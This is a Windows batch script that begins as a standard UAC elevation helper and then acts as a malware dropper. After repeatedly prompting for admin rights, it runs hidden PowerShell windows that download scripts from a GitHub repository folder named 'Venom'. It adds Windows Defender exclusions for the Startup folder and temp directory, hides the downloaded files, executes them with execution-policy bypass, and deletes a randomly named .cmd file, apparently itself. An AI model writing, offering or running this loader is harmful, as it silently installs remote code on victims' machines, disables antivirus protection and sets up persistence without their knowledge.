
@echo off
:: BatchGotAdmin
:-------------------------------------
setlocal enabledelayedexpansion

set "attempt=1"
if not "%~1"=="" set /a "attempt=%~1"

:: Add delay after the first attempt
if %attempt% gtr 1 (
    echo Waiting 5 seconds before retry...
    timeout /t 5 /nobreak >nul
)

:checkAdmin
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    if %attempt% geq 7 (
        echo Maximum attempts (7) reached. Exiting.
        exit /b 1
    )
    echo Requesting administrative privileges (Attempt %attempt%)...
    goto UACPrompt
) else ( 
    goto gotAdmin 
)

:UACPrompt
    set /a "new_attempt=attempt+1"
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %new_attempt%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
    echo Success: Running with admin privileges.
    REM Your admin-only commands go here
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer1.ps1 -OutFile BVrAihDwJNvc.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/AutoRun.bat -OutFile nEQlCzTBpDrO.bat"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1 -OutFile AmJOwiWzUEbZ.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'


attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"

attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"

powershell powershell.exe -windowstyle hidden -ep bypass "./BVrAihDwJNvc.ps1"

powershell powershell.exe -windowstyle hidden -ep bypass "./AmJOwiWzUEbZ.ps1"

del IVbaANzwiphH.cmd
